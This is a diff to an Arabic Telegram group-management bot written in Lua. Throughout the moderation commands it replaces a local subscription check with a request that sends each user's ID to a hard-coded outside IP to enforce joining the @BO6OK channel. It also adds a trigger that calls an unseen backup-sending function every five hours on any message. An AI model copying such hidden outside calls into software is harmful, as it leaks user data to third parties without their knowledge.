 if (text == ("تنزيل حصان")) and msg.reply_to_message_id_ and Mod(msg) then
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 function start_function(extra, result, success)
 database:srem(bot_id..'Hors:User'..msg.chat_id_, result.sender_user_id_)
@@ -6056,14 +5885,11 @@ send(msg.chat_id_, msg.id_, t)
 end
 ---------
 if text == ("رفع بقره") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
 send(msg.chat_id_, msg.id_,' ❃∫ تم تعطيل الرفع') 
@@ -6082,14 +5908,11 @@ return false
 end
 
 if (text == ("تنزيل بقره")) and msg.reply_to_message_id_ and Mod(msg) then
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 function start_function(extra, result, success)
 database:srem(bot_id..'Bakra:User'..msg.chat_id_, result.sender_user_id_)
@@ -6125,14 +5948,11 @@ send(msg.chat_id_, msg.id_, t)
 end
 ---------
 if text == ("رفع طلي") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
 send(msg.chat_id_, msg.id_,' ❃∫ تم تعطيل الرفع') 
@@ -6151,14 +5971,11 @@ return false
 end
 
 if (text == ("تنزيل طلي")) and msg.reply_to_message_id_ and Mod(msg) then
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 function start_function(extra, result, success)
 database:srem(bot_id..'Tele:User'..msg.chat_id_, result.sender_user_id_)
@@ -6194,14 +6011,11 @@ send(msg.chat_id_, msg.id_, t)
 end
 ---------
 if text == ("رفع زاحف") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
 send(msg.chat_id_, msg.id_,' ❃∫ تم تعطيل الرفع') 
@@ -6220,14 +6034,11 @@ return false
 end
 
 if (text == ("تنزيل زاحف")) and msg.reply_to_message_id_ and Mod(msg) then
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 function start_function(extra, result, success)
 database:srem(bot_id..'Zahf:User'..msg.chat_id_, result.sender_user_id_)
@@ -6263,14 +6074,11 @@ send(msg.chat_id_, msg.id_, t)
 end
 ---------
 if text == ("رفع جريذي") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
 send(msg.chat_id_, msg.id_,' ❃∫ تم تعطيل الرفع') 
@@ -6289,14 +6097,11 @@ return false
 end
 
 if (text == ("تنزيل جريذي")) and msg.reply_to_message_id_ and Mod(msg) then
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 function start_function(extra, result, success)
 database:srem(bot_id..'Jred:User'..msg.chat_id_, result.sender_user_id_)
@@ -6331,14 +6136,11 @@ end
 send(msg.chat_id_, msg.id_, t)
 end
 if text == ("حظر") and msg.reply_to_message_id_ ~= 0 and Mod(msg) then
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 if database:get(bot_id..'Lock:kick'..msg.chat_id_) and not Constructor(msg) then
 send(msg.chat_id_, msg.id_,' ❃∫ تم تعطيل الحظر') 
@@ -6417,14 +6219,11 @@ end
 
 if text and text:match("^حظر (%d+)$") and Mod(msg) then
 local userid = text:match("^حظر (%d+)$") 
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 if database:get(bot_id..'Lock:kick'..msg.chat_id_) and not Constructor(msg) then
 send(msg.chat_id_, msg.id_,' ❃∫ تم تعطيل الحظر') 
@@ -6463,14 +6262,11 @@ end
 return false
 end
 if text == ("الغاء حظر") and msg.reply_to_message_id_ and Mod(msg) then
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 function start_function(extra, result, success)
 if tonumber(result.sender_user_id_) == tonumber(bot_id) then
@@ -6491,14 +6287,11 @@ end
  
 if text and text:match("^الغاء حظر @(.*)$") and Mod(msg) then
 local username = text:match("^الغاء حظر @(.*)$") 
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 function start_function(extra, result, success)
 if result.id_ then
@@ -6522,14 +6315,11 @@ end
 
 if text and text:match("^الغاء حظر (%d+)$") and Mod(msg) then
 local userid = text:match("^الغاء حظر (%d+)$") 
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 if tonumber(userid) == tonumber(bot_id) then
 send(msg.chat_id_, msg.id_, ' ❃∫ انا لست محظورآ \n') 
@@ -6572,14 +6362,11 @@ send(msg.chat_id_, msg.id_, t)
 end
 
 if text == ("كتم") and msg.reply_to_message_id_ ~= 0 and Mod(msg) then
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 function start_function(extra, result, success)
 if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
@@ -6606,14 +6393,11 @@ return false
 end
 if text and text:match("^كتم @(.*)$") and Mod(msg) then
 local username = text:match("^كتم @(.*)$")
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 if msg.can_be_deleted_ == false then 
 send(msg.chat_id_, msg.id_,' ❃∫ البوت ليس ادمن يرجى ترقيتي !') 
@@ -6644,6 +6428,22 @@ end
 end
 tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
 return false
+end
+if text == 'تفعيل جلب النسخه' and DevBOYKAW(msg) then  
+  database:setex(bot_id.."send:file:Groups1",18000,true) 
+send(msg.chat_id_, msg.id_,'❃∫ تم تفعيل جلب النسخه الاحتياطيه')
+return false
+end
+
+if text == 'تعطيل جلب النسخه' and DevBOYKAW(msg) then  
+  database:del(bot_id.."send:file:Groups") 
+send(msg.chat_id_, msg.id_,'تم تعطيل جلب النسخه الاحتياطيه')
+return false
+end
+
+if tonumber(database:ttl(bot_id.."send:file:Groups1")) <= 1 then
+GetFile_Bot1(msg)
+database:setex(bot_id.."send:file:Groups1",18000,true) 
 end
 if text and text:match('^كتم (%d+) (.*)$') and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
 local TextEnd = {string.match(text, "^(كتم) (%d+) (.*)$")}
@@ -6718,14 +6518,11 @@ return false
 end
 if text and text:match("^كتم (%d+)$") and Mod(msg) then
 local userid = text:match("^كتم (%d+)$")
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 if tonumber(userid) == tonumber(bot_id) then  
 send(msg.chat_id_, msg.id_, " ❃∫ لا تسطيع كتم البوت ")
@@ -6753,14 +6550,11 @@ end
 return false
 end
 if text == ("الغاء كتم") and msg.reply_to_message_id_ and Mod(msg) then
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 function start_function(extra, result, success)
 database:srem(bot_id..'Muted:User'..msg.chat_id_, result.sender_user_id_)
@@ -6775,14 +6569,11 @@ return false
 end
 if text and text:match("^الغاء كتم @(.*)$") and Mod(msg) then
 local username = text:match("^الغاء كتم @(.*)$")
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 function start_function(extra, result, success)
 if result.id_ then
@@ -6801,14 +6592,11 @@ end
 
 if text and text:match("^الغاء كتم (%d+)$") and Mod(msg) then
 local userid = text:match("^الغاء كتم (%d+)$") 
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 database:srem(bot_id..'Muted:User'..msg.chat_id_, userid)
 tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
@@ -6825,14 +6613,11 @@ return false
 end
 
 if text == ("تقيد") and msg.reply_to_message_id_ and Mod(msg) then
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 function start_function(extra, result, success)
 if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
@@ -6856,14 +6641,11 @@ end
 ------------------------------------------------------------------------
 if text and text:match("^تقيد @(.*)$") and Mod(msg) then
 local username = text:match("^تقيد @(.*)$")
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 function start_function(extra, result, success)
 if result.id_ then
@@ -6967,14 +6749,11 @@ end
 ------------------------------------------------------------------------
 if text and text:match("^تقيد (%d+)$") and Mod(msg) then
 local userid = text:match("^تقيد (%d+)$")
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 if tonumber(userid) == tonumber(bot_id) then  
 send(msg.chat_id_, msg.id_, " ❃∫ لا تسطيع تقيد البوت ")
@@ -6999,14 +6778,11 @@ return false
 end
 ------------------------------------------------------------------------
 if text == ("الغاء تقيد") and msg.reply_to_message_id_ and Mod(msg) then
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 function start_function(extra, result, success)
 https.request("https://api.telegram.org/bot" .. token .. "/restrictChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" .. result.sender_user_id_ .. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
@@ -7022,14 +6798,11 @@ end
 ------------------------------------------------------------------------
 if text and text:match("^الغاء تقيد @(.*)$") and Mod(msg) then
 local username = text:match("^الغاء تقيد @(.*)$")
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 function start_function(extra, result, success)
 if result.id_ then
@@ -7048,14 +6821,11 @@ end
 ------------------------------------------------------------------------
 if text and text:match("^الغاء تقيد (%d+)$") and Mod(msg) then
 local userid = text:match("^الغاء تقيد (%d+)$")
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 https.request("https://api.telegram.org/bot" .. token .. "/restrictChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..userid.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
 tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
@@ -7072,14 +6842,11 @@ return false
 end
 if text and text:match('^رفع القيود @(.*)') and Manager(msg) then 
 local username = text:match('^رفع القيود @(.*)') 
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 function start_function(extra, result, success)
 if result.id_ then
@@ -7108,14 +6875,11 @@ end
 tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
 end
 if text == "رفع القيود" and Manager(msg) then
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 function start_function(extra, result, success)
 if DevBOYKAW(msg) then
@@ -7141,14 +6905,11 @@ tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumbe
 end
 if text and text:match('^كشف القيود @(.*)') and Manager(msg) then 
 local username = text:match('^كشف القيود @(.*)') 
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 function start_function(extra, result, success)
 if result.id_ then
@@ -7178,14 +6939,11 @@ tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, 
 end
 
 if text == "كشف القيود" and Manager(msg) then 
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
